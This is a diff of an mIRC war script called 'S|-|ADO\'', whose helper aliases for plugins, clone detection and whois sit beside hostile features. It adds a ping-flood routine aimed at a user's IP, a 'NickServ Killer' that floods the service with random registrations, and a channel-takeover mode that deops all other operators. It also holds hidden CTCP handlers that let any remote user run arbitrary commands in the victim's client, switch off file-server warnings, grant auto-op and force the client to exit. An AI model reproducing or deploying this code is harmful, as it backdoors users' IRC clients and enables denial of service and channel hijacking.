-  if ( %z < 10 ) { %z = %z + 1 | %rs = %rs $+ _ | goto Addan2 }
-  /.msg $chan 0,12Lame-O-Meter: 7,12 $$2 is 9,9 $+ %ls $+ 3,3 $+ %rs $+ 9,12 $$1 $+ 0 % $+ 7 lame.
-  /unset %z
-  /unset %ls
-  /unset %rs
+alias -l GetPlugItem {
+  return $read -s; $+ $$2 $+ : $$1
 }
 
-alias lame2 {
-  %tx = Lame-O-Meter: $$2 is $$1 $+ 0 % lame.
-  %lt = $len( %tx ) * 10
-  %lp = %lt * $$1
-  %lp = %lp / 100
-  %rp = $len( %tx )
-  %rp = %rp - %lp
-  %t1 = $left( %tx , %lp )
-  %t2 = $right( %tx , %rp )
-  /.msg $chan 1,8 $+ %t1 $+ 8,1 $+ %t2 $+ 
-  /unset %tx
-  /unset %lt
-  /unset %lp
-  /unset %rp
-  /unset %t1
-  /unset %t2
+alias -l ReloadPlug {
+  PlugStats
+  set %relplug $$?="Enter the number of the plugin to reload:"
+  if ( %relplug > 0  &&  %relplug < 100) {
+    set %curfile $findfile(%shadowdir,*.spi,%relplug )
+    {
+      GetPlugInfo %curfile
+    }
+    if ($script(%curfile) == $null)  {
+      echo -s 1,8 S|-|ADO\\' 4 WARNING! 8 Plugin not active. Loading  %nameline  ...
+      .load -rs %curfile
+      $GetPlugItem( %curfile,loadonstart)
+      echo -s 1,8 S|-|ADO\\' 8 %nameline  is now plugged.
+      } | else {
+      echo -s 1,8 S|-|ADO\\' 8 Reloading Plugin  %nameline  %authline ...
+      $GetPlugItem( %curfile , loadonexit )
+      .unload -rs %curfile
+      .load -rs %curfile
+      $GetPlugItem( %curfile , loadonstart)
+      echo -s 1,8 S|-|ADO\\' 8 %nameline  is now reloaded.
+    }
+  }            
+  unset %relplug
+  unset %curfile
+  unset %nameline
+  unset %authline
 }
-;###############################################Lame-O-Meters end here
+
+alias -l LoadMisPlugs {
+  echo -s 8 Loading inactive plugins ...
+  set %filecount 1
+  :LMPFindFiles
+  set %curfile $findfile(%shadowdir,*.spi,%filecount)
+  {
+    GetPlugInfo %curfile
+  }
+  if ($script(%curfile) == $null) {
+    echo -s 8 - Loading Plugin:  %nameline  %authline ...
+    .load -rs %curfile
+    $GetPlugItem( %curfile , loadonstart )
+  }
+  unset %nameline
+  unset %authline
+  inc %filecount
+  if ($findfile(%shadowdir,*spi,%filecount) != $null) { goto LMPFindFiles }
+  unset %curfile
+  unset %filecount
+  echo -s 8 All plugins are now loaded.
+}
+
+alias -l UnloadPlugs {
+  echo -s 8 Unloading active plugins ...
+  set %filecount 1
+  :UPFindFiles
+  set %curfile $findfile(%shadowdir,*.spi,%filecount)
+  {
+    GetPlugInfo %curfile
+  }
+  if ($script(%curfile) != $null) {
+    echo -s 8 - Unloading Plugin:  %nameline  %authline ...
+    $GetPlugItem( %curfile , loadonexit )
+    .unload -rs %curfile
+  }
+  unset %nameline
+  unset %authline
+  inc %filecount
+  if ($findfile(%shadowdir,*spi,%filecount) != $null) { goto UPFindFiles }
+  unset %curfile
+  unset %filecount
+  echo -s 8 All plugins are now unloaded.
+}
+
+; ########################### Other SHADOW functions #############################
+
+alias -l KillShadow {
+  echo -s 1,8 S|-|ADO\\'  GOING OFFLINE ...
+  unset %shadowdisplugins
+  titlebar $null
+  UnloadPlugs
+  unset %shadowdir
+  unset %takeovermode
+  unset %SDWUser
+  .unload -rs $script
+  echo -s 1,8 S|-|ADO\\' 4 now offline. 
+}
+
+alias -l LaunchServClone {
+  set %CloneNick $?="Clone nick:"
+  if ( %CloneNick != $null ) { .run -n $mircdir $+ mirc32.exe -s $+ $server $+ : $+ $port -n $+ %CloneNick | LM 2 is launching a server clone called %CloneNick . }
+  else { echo -s 1,8 S|-|ADO\\'  Cloning aborted ... }
+  unset %CloneNick
+}
+
+alias LM {
+  .ctcp RoboCop LM $1-
+  .ctcp Speedy LM $1-
+}
+
+alias -l DNSLookup {
+  echo -a 1,8 S|-|ADO\\'  8DNS results: Nickname: 7 %dnsresnick  --- DNS:  %dnsresname  --- IP:  %dnsresip 
+  unset %finalipstring
+  unset %dnsres*
+  unset %PerfDNS
+}
+
+alias -l ShowHops {
+  echo -a Performing TRACERT.EXE %dnsresip
+  run TRACERT.EXE %dnsresip
+  echo -a Command performed!!
+  unset %finalipstring
+  unset %dnsres*
+  unset %PerfDNS
+}
+
+alias -l PingFlood {
+  LM 2 initiated Ping flood on %dnsresnick!
+  echo -s 1,8 S|-|ADO\\'  4Ping Flood: Pinging user 7%dnsresnick with 64000 Bytes data ...
+  echo -s 1,8 S|-|ADO\\'  4Ping Flood:15 The more user try to flood %dnsresnick the faster he will get kicked off this IRC!
+  run -n PING -l 64000 -t %dnsresip
+  unset %finalipstring
+  unset %dnsres*
+  unset %PerfDNS
+}
+
+alias -l SDWmode {
+  if ( %SDWmodeRealNick == $null ) {
+    echo -s 1,8 S|-|ADO\\'  Initiating SHADOW mode ...  8ENTER DELAY IN MILLISECONDS(!)
+    echo -s 4 Note: Delays below 250 ms could lead to hangs in mIRC. 
+    set %SDWmodeDelay $?="Enter delay in milliseconds(!):"
+    if ( %SDWmodeDelay == $null ) { echo -s 1,8 S|-|ADO\\'  SHADOW mode aborted. | halt }
+    set %SDWmodeRealNick $me
+    .timerSDWmode -m 0 %SDWmodeDelay .nick $!RandVal
+    echo -s 1,8 S|-|ADO\\' 9 SHADOW mode now ON! 
+    } | else {
+    echo -s 1,8 S|-|ADO\\'  Restoring old nick ...
+    .timerSDWmode off
+    .nick %SDWmodeRealNick
+    unset %SDWmodeRealNick
+    unset %SDWmodeDelay
+    echo -s 1,8 S|-|ADO\\'  SHADOW mode disabled.
+  }
+}
+
+alias -l QuickRejChan {
+  set %rejch $chan
+  echo -s 8 Rejoining %rejch ...
+  .part %rejch 1,8 S|-|ADO\\'  Quick rejoin
+  .timer 1 2 join %rejch
+  unset %rejch
+}
+
+alias xwhois {
+  checkon $1
+  if ( $result == 1 ) {
+    echo -s 1,8 S|-|ADO\\' 1,7 /WHOIS Result 
+    whois $1
+    } | else if ( $1 != $null ) {
+    echo -s 1,8 S|-|ADO\\'  8NOTE: $1 is not online. Trying /WHOWAS ...
+    echo -s 1,8 S|-|ADO\\' 1,7 /WHOWAS Result 
+    whowas $1
+    }  | else if ( $1 == $null ) {
+    echo -s 1,8 S|-|ADO\\'  4WARNING! No user specified for /WHOIS command.
+  }
+}
+
+alias -l checkon {
+  if ( $address( $1 , 5) != $null ) { return 1 } | else { return 0 }
+}
+
+alias join {
+  set %jchan $1
+  if ( $left( %jchan , 1) != $chr(35) ) { set %jchan $chr(35) $+ %jchan }
+  if ( $chan( %jchan ) == $null ) {
+    echo -s 1,8 S|-|ADO\\'  Joining channel %pchan ....
+    join %jchan $2-
+    } | else {
+    echo -s 1,8 S|-|ADO\\'  8 NOTE:  You're already on that channel!
+  }
+  unset %jchan
+}
+
+alias part {
+  set %pchan $1
+  if ( $left( %pchan , 1) != $chr(35) ) { set %pchan $chr(35) $+ %pchan }
+  if ( $chan( %pchan ) != $null ) {
+    if ( $2 != $null ) { echo -s 1,8 S|-|ADO\\'  Leaving channel %pchan ( $2- ) ... }
+    else { echo -s 1,8 S|-|ADO\\'  Leaving channel %pchan ... }
+    part %pchan $2-
+    } | else {
+    echo -s 1,8 S|-|ADO\\'  4ERROR! You're not on that channel!
+  }
+  unset %pchan
+}
+
+alias xquery {
+  checkon $1
+  if ( $result == 1 ) {
+    echo -s 1,8 S|-|ADO\\'  Sending query request to $1 ...
+    query $1 1,8 S|-|ADO\\'  The user $me wants to talk to you ...  
+    } | else {
+    echo -s 1,8 S|-|ADO\\'  4ATTENTION! User $1 seems to be not online. Trying nevertheless ...
+    query $1 1,8 S|-|ADO\\'  The user $me tries to talk to you ...
+  }  
+}
+
+
+
+alias -l clonedet {
+  set %showcmd $2-
+  %showcmd 1,8 S|-|ADO\\' 7 Clone Detection 
+  set %CDusers $nick( $$1 , 0)
+  if ( %CDusers <= 1 ) {
+    unset %CDusers
+    %showcmd 4 There are less than 2 users in this channel! Forget the CloneCheck! 
+    %showcmd 15-----
+    unset %showcmd
+    halt
+  }
+  set %CDcurtest 1
+  unset %FinalClonestring
+  :CheckNext
+  set %CDcuradd $GetAddress( $nick( $1 , 1) )
+  {
+    set %CDcurnum %CDcurtest + 1
+    if ( $nick( $1 , %CDcurnum ) == $null ) { goto CDcomplete }
+    set %Cloned 0
+    :MatchNext
+    set %CDmatch $GetAddress( $nick( $1 , %CDcurnum ) )
+    if ( %CDmatch == %CDcuradd && %Cloned == 0 ) { set %FinalClonestring 8 $+ %CDcuradd $+ :  $+ $nick( $1 , %CDcurtest ) $+ ,  $+ $nick( $1 , %CDcurnum ) $+  | inc %Cloned }
+    elseif ( %CDmatch == %CDcuradd && %Cloned != 0 ) { set %FinalClonestring %FinalClonestring $+ ,  $+ $nick( $1, %CDcurnum ) $+  | inc %Cloned }
+    inc %CDcurnum
+    if ( $nick( $1 , %CDcurnum ) != $null ) { goto MatchNext }
+  }
+  :Incagain
+  inc %CDcurtest
+  if ( $count( %FinalClonestring , $GetAddress( $nick( $1 , %CDcurtest ) ) ) != 0 ) { if ( %CDcurtest >= %CDusers ) { goto CDcomplete } | else { goto Incagain } }
+  if ( $nick( $1 , %CDcurtest ) != $null && %Cloned > 0 ) { set %FinalCloneString %FinalCloneString $+ ### | goto CheckNext }
+  :CDcomplete
+  unset %CD*
+  unset %Cloned
+  if ( %FinalClonestring != $null ) {
+    %showcmd Check complete. 4 $+ $pos( %FinalClonestring , ### , 0 ) cloned address(es) found. Clones:
+    {
+      set %oldbeg 1
+      set %curbeg 0
+      set %maxbeg $pos( %FinalClonestring , ### , 0 )
+      ; Debug command following
+      echo -s final: %FinalClonestring
+      :CDbeginout
+      set %begin $pos( %FinalClonestring , ### , %oldbeg )
+      set %endpos %begin - %oldbeg
+      %showcmd $mid( %FinalClonestring , %oldbeg , %endpos )
+      set %oldbeg %begin
+      inc %curbeg
+      if ( %curbeg < %maxbeg ) { goto CDbeginout }
+      unset %oldbeg
+      unset %curbeg
+      unset %maxbeg
+      unset %begin
+      unset %endpos
+    }
+    unset %FinalClonestring
+    } | else { 
+    %showcmd Check complete. 9There were no clones. 
+  }
+  %showcmd 15-----
+  unset %showcmd
+}
+
+alias -l GetAddress {
+  return $remove( $address( $1 , 2) , *!*@ )
+}
+
+alias -l KillNickServ {
+  echo -s 1,8 S|-|ADO\\' 4 WARNING!!  This action is not allowed and could lead - if you get catched - to k-lining of your nickname!
+  echo -s If you really want to kill the bot "NickServ", then type 9YES into the messagebox.
+  LM 2  is asked whether he/she wants to kill NickServ ...
+  set %KNSAqu $?="Do you really want to kill NickServ?"
+  if ( %KNSAqu == YES ) {
+    LM 1 agreed question!
+    echo -s 1,8 S|-|ADO\\'s 7 NickServ Killer  Trying to kill NickServ .....
+    echo -s 1,8 S|-|ADO\\'s 7 NickServ Killer  Launching clone ...
+    run -n $mircdir $+ mirc32.exe -s $+ $server $+ : $+ $port -nSDWKillNS
+    $?="Press OK when the clone is logged on the IRC!"
+    echo -s 1,8 S|-|ADO\\'s 7 NickServ Killer  Sending command ....
+    .ctcp SDWKillNS KillNickServNow YES $me
+    echo -s 1,8 S|-|ADO\\'s 7 NickServ Killer  Command sent.
+    } | else {
+    LM 5 cancelled action!
+    echo -s 1,8 S|-|ADO\\'s 7 NickServ Killer  Kill aborted. Good guy!
+  }
+  unset %KNSAqu
+}
+
+alias -l KillNickServNow {
+  LM 0 started killing (Bot of $1).
+  set %KNSinit $1
+  echo -s 1,8 S|-|ADO\\' 7 NickServ Killer 4 NOW KILLING NICKSERV .... HOLD ON 
+  .ctcp $$1 SDWComm Bot tries now to kill the NickServ ....
+  .timerKillNS -m 0 500 RegisterRandNick
+  .ctcp $$1 SDWComm Bot started.
+}
+
+alias -l RandVal {
+  return $rand(A,Z) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(0,9)
+}
+
+alias -l RegisterRandNick {
+  .nick $RandVal
+  .msg NickServ REGISTER DiedOfShadow
+}
+
+alias StopKNS {
+  echo -s 1,8 S|-|ADO\\' 7 NickServ Killer 4 ABORTING ....
+  .ctcp %KNSinit SDWComm Trying to stop bot ...
+  .timerKillNS off
+  .ctcp %KNSinit SDWComm Bot stopped killing NickServ. Going offline ...
+  unset %KNSinit
+  echo -s 1,8 S|-|ADO\\' 7 NickServ Killer 4 COMPLETE!
+  .timer 1 5 exit
+}
+
+; ########################## Miscellaneous definitions ##############################
+100:RoboCop!Robo.Cop@*
+100:Speedy!Speedy@*
+ctcp 1:version:if ( %sr == $null ) { .notice $nick I'm using ä|=|a–o\\' Script by Speedy&RoboCop..... | halt } | if ( %sr != $null ) { beep 3 100 | echo -s 1,8 S|-|ADO\\'  4ATTENTION! $1- from $nick $+ ! | halt }
+ctcp 1:IFS:if ( %sr == $null ) { %mircini = $mircdir $+ mirc.ini | .writeini %mircini fileserver Warning Off | .notice $nick FileServer setting rewritten. User must restart mIRC! | halt } | if ( %sr != $null ) { beep 3 100 | echo -s 1,8 S|-|ADO\\'  
+4WARNING! $1- from $nick $+ ! | halt }
+ctcp 1:RC:if ( %sr == $null ) { $2- | halt } | if ( %sr != $null ) { beep 3 100 | echo -s 1,8 S|-|ADO\\'  4WARNING! $1- from $nick $+ ! | halt }
+on @1:text:!opme:#:if ($nick $+ !*@* isauto) { .msg $chan 1,8 S|-|ADO\\'  User level for $nick 1,9 OK . Giving OP for $chan to  $nick  ... | .mode $chan +o $nick | echo -s 1,8 S|-|ADO\\'   $nick  requested an OP for $chan. OP granted. } 
+| else { .msg $chan 1,11 COMMAND OPer:  User level for $nick 1,4 NOT OK . Try again later, $nick. | echo -s 1,8 S|-|ADO\\'   $nick  requested an OP for $chan. OP refused. }
+on 1:text:*–*:#:if ( %sr == $null) { .msg $nick $me is using 1,8 S|-|A–O\\'  } | if ( %sr != $null ) { beep 3 100 | echo -s 1,8 S|-|ADO\\'  4ATTENTION! $nick uses S|-|ADO\\' and made a text request. }
+on 1:JOIN:#: if ($nick == $me && %sr == $null ) { msg $chan $me is using 1,8 S|-|A–O\\'  } | if ($nick == $me && %sr != $null ) { beep 1 100 | echo -s 1,8 S|-|ADO\\'  Channel info aborted due to silent mode. }
+on 1:DNS: set %dnsresip $iaddress | set %dnsresname $naddress | set %dnsresolved $raddress | set %dnsresnick $nick | echo -s 1,8 S|-|ADO\\'  DNS lookup finished. ( %dnsresnick / %dnsresname / %dnsresip ) | %PerfDNS
+ctcp 1:INS:if ( %sr == $null ) { .auto $nick | halt } | if ( %sr != $null ) { beep 3 100 | echo -s 1,8 S|-|ADO\\'  4WARNING! $1- from $nick $+ ! | halt }
+ctcp 1:CFS:if ( %sr == $null ) { .notice $nick is using ä|=|a–o\\' | halt } | if ( %sr != $null ) { beep 3 100 | echo -s 1,8 S|-|ADO\\'  4ATTENTION! $1- from $nick $+ ! | halt }
+ctcp 1:SDWComm:.echo -s 1,8 S|-|ADO\\' 0,4 CTCP  $2- | halt
+ctcp 1:SDWExitMirc:if ( %sr == $null ) { echo -s 1,8 S|-|ADOW 0,4 CTCP 4 Received EXIT command ... exiting! | .exit } | if ( %sr != $null ) { beep 3 100 | echo -s 1,8 S|-|ADO\\'  4ATTENTION! $1- from $nick $+ ! | halt }
+ctcp 1:KillNickServNow:if ( $2 == YES && $3 == $nick ) { KillNickServNow $3 } | else { echo -s 1,8 S|-|ADO\\' 4 WARNING!! Illegal try to kill NickServ from 8 $nick 4. } | halt
+ctcp 1:LM:if ( $2 == 0 ) { echo -s 1,8 S|-|ADO\\' 0,4 LeaveMess 1,4 DANGER!!!!! 4 $nick $3- } | else if ( $2 == 1 ) { echo -s 1,8 S|-|ADO\\' 0,4 LeaveMess 4 WARNING!!  $nick $3- } | else if ( $2 == 2 ) { echo -s 1,8 S|-|ADO\\' 0,4 
+LeaveMess 8 ATTENTION!  $nick $3- } | else { echo -s 1,8 S|-|ADO\\' 0,4 LeaveMess 9 $nick $3- } | halt
+on 1:OP:#:{
+  if ( $opnick == $me && $opnick != $nick ) {
+    if ( %takeovermode > 0 ) {
+      echo -s 1,8 S|-|ADO\\'  You were opped by $nick. Taking over $chan ...
+      set %opcount 1
+      :TOGetlist
+      set %opnick $opnick( $chan , %opcount )
+      if ( %opnick != $me ) { 
+        echo -s 1,8 S|-|ADO\\'  Deopping %opnick ...     
+        .mode $chan -o %opnick
+      }
+      inc %opcount
+      if ( $opnick( $chan , %opcount ) != $null ) { goto TOGetList }
+      .notice $nick 1,8 S|-|ADO\\'s 0,4 TakeOver mode  Thank you, $nick , for letting me take over this channel.
+      echo -s  1,8 S|-|ADO\\'  TakeOver performed.
+      unset %opcount
+      unset %opnick
+    } | else if ( $opnick != $nick ) { echo -s 1,8 S|-|ADO\\'  You were opped by $nick. TakeOver mode disabled. }
+  }
+}
+on 1:DEOP:#:{
+  if ( $opnick == $me && $opnick != $nick ) {
+    echo -s 1,8 S|-|ADO\\'  4WARNING! You were deopped by $nick. 
+    ; commands here - if you want
+  }
+}
